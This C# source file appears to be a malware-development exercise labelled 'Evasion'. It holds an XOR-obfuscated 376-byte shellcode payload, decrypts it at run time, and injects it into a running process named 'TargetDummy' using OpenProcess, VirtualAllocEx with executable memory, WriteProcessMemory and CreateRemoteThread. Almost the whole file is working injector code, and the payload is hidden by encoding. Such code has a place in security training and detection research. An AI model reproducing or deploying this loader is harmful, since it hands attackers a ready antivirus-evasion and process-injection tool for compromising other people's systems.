using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MaldevEx3_Evasion
{
    class Program
    {
        public static byte[] Xor(byte[] data, byte[] key)
        {
            if (data == null) throw new ArgumentNullException(nameof(data));
            if (key == null || key.Length == 0) throw new ArgumentException("Key must not be empty.", nameof(key));

            var output = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                output[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return output;
        }

        static void Main(string[] args)
        {
            byte[] key = { 0x13, 0x37, 0xC0, 0xDE };

            byte[] encrypted = new byte[376] { 0xEF, 0x7F, 0x41, 0x3A, 0xE3, 0xC8, 
            0x3F, 0x21, 0xFB, 0xFB, 0xC0, 0xDE, 0x13, 0x76, 0x91, 0x9F, 0x43, 0x65, 
            0x91, 0x88, 0x5B, 0x06, 0x12, 0xBB, 0x5B, 0xBC, 0x92, 0xBE, 0x5B, 0xBC, 
            0x92, 0xC6, 0x5B, 0xBC, 0x92, 0xFE, 0x5B, 0xBC, 0xB2, 0x8E, 0x5B, 0x38, 
            0x77, 0x94, 0x59, 0x7A, 0xF1, 0x17, 0x5B, 0x06, 0x00, 0x72, 0x2F, 0x56, 
            0xBC, 0xDC, 0x3F, 0x17, 0x81, 0x1F, 0xDA, 0x3A, 0x81, 0xDF, 0xD2, 0xD5, 
            0x2D, 0x8C, 0x5B, 0xBC, 0x92, 0xFE, 0x52, 0x66, 0x4B, 0x9C, 0x2F, 0x7F, 
            0xC1, 0x0E, 0x75, 0xB6, 0xB8, 0xC6, 0x18, 0x35, 0xCF, 0x5B, 0x61, 0x37, 
            0xC0, 0xDE, 0x98, 0xB7, 0x48, 0xDE, 0x13, 0x37, 0x88, 0x5B, 0xD3, 0x43, 
            0xA7, 0x96, 0x12, 0xE7, 0x4B, 0x96, 0x0B, 0x67, 0x84, 0x55, 0x53, 0x17, 
            0x89, 0xDF, 0xC3, 0xD4, 0x96, 0x93, 0x22, 0xFE, 0x88, 0x21, 0xDA, 0x76, 
            0x4B, 0xEA, 0x9B, 0x7F, 0xC1, 0x08, 0x5B, 0x06, 0x00, 0x9F, 0xD2, 0xFE, 
            0xCD, 0x72, 0x52, 0x36, 0x01, 0xE6, 0xF3, 0x42, 0x31, 0x92, 0x10, 0x7B, 
            0xE4, 0xD6, 0x56, 0x0E, 0x11, 0xAB, 0xCB, 0x6F, 0x84, 0x55, 0x53, 0x13, 
            0x89, 0xDF, 0xC3, 0x51, 0x81, 0x55, 0x1F, 0x7F, 0x84, 0x55, 0x53, 0x2B, 
            0x89, 0xDF, 0xC3, 0x76, 0x4B, 0xDA, 0x9B, 0x7F, 0xC1, 0x0E, 0x52, 0x6F, 
            0x81, 0x86, 0x4D, 0x6E, 0x9A, 0x9F, 0x4B, 0x76, 0x99, 0x9F, 0x49, 0x7F, 
            0x43, 0x32, 0x33, 0x76, 0x92, 0x21, 0xF3, 0x6F, 0x81, 0x87, 0x49, 0x7F, 
            0x4B, 0xCC, 0xFA, 0x7C, 0x3F, 0x21, 0xEC, 0x6A, 0x28, 0xD5, 0x13, 0x37, 
            0xC0, 0xAB, 0x60, 0x52, 0xB2, 0xED, 0x21, 0x19, 0xA4, 0xB2, 0x7F, 0x37, 
            0x99, 0x9F, 0xA9, 0x7B, 0xB7, 0xF8, 0x14, 0xC8, 0x15, 0x97, 0xD4, 0xF6, 
            0xC0, 0xDE, 0x13, 0x37, 0x28, 0xF0, 0x13, 0x37, 0xC0, 0x8D, 0x7B, 0x52, 
            0xAC, 0xB2, 0x70, 0x58, 0xA4, 0xBB, 0x33, 0x52, 0xAE, 0xBD, 0x61, 0x4E, 
            0xB0, 0xAA, 0x76, 0x53, 0xE0, 0xBB, 0x6B, 0x52, 0xA3, 0xAB, 0x67, 0x52, 
            0xA4, 0xFE, 0x7A, 0x59, 0xE0, 0xB3, 0x76, 0x5A, 0xAF, 0xAC, 0x6A, 0x17, 
            0xB6, 0xB7, 0x72, 0x17, 0x83, 0xFD, 0x13, 0x6D, 0x28, 0xF3, 0x13, 0x37, 
            0xC0, 0x93, 0x72, 0x5B, 0x84, 0xBB, 0x65, 0x17, 0x85, 0xA6, 0x76, 0x45, 
            0xA3, 0xB7, 0x70, 0x52, 0xF3, 0xFE, 0x56, 0x41, 0xA1, 0xAD, 0x7A, 0x58, 
            0xAE, 0xFE, 0x5A, 0x59, 0xAA, 0xBB, 0x70, 0x43, 0xA9, 0xB1, 0x7D, 0x17, 
            0x97, 0xB7, 0x7D, 0x53, 0xAF, 0xA9, 0x60, 0x06, 0xF1, 0xDE, 0x52, 0x6F, 
            0x88, 0xEF, 0xDA, 0x76, 0x7A, 0x9B, 0x90, 0x61, 0xC7, 0x21, 0xC6, 0x7F, 
            0xF1, 0x17, 0x52, 0x8D, 0x30, 0x6B, 0xB1, 0x61, 0x3F, 0x0B };

            // Dechiffrement = re-XOR avec la meme clef
            byte[] decrypted = Xor(encrypted, key);

            Console.WriteLine(BitConverter.ToString(decrypted));

            int len = decrypted.Length;

            string targetProc = "TargetDummy";
            Process[] expProc = Process.GetProcessesByName(targetProc);
            if (expProc.Length == 0)
            {
                Console.WriteLine($"No {targetProc} found. Is it running?");
                return;
            }

            int pid = expProc[0].Id;
            Console.WriteLine($"Target process: {targetProc} [{pid}].");

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);
            if (procHandle == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"OpenProcess failed. Win32 Error: {error}");
                return;
            }

            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ExecuteReadWrite);

            if (memAddr == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"VirtualAllocEx failed. Win32 Error: {error}");
                return;
            }

            IntPtr bytesWritten;
            bool ok = WriteProcessMemory(procHandle, memAddr, decrypted, len, out bytesWritten);
            if (!ok)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"WriteProcessMemory failed. Win32 Error: {error}");
                return;
            }

            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            if (tAddr == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"CreateRemoteThread failed. Win32 Error: {error}");
                return;
            }

            CloseHandle(tAddr);
            CloseHandle(procHandle);

        }

        #region pinvokes
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize,
            AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress,
            byte[] buffer, int size, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);
        #endregion
    }
}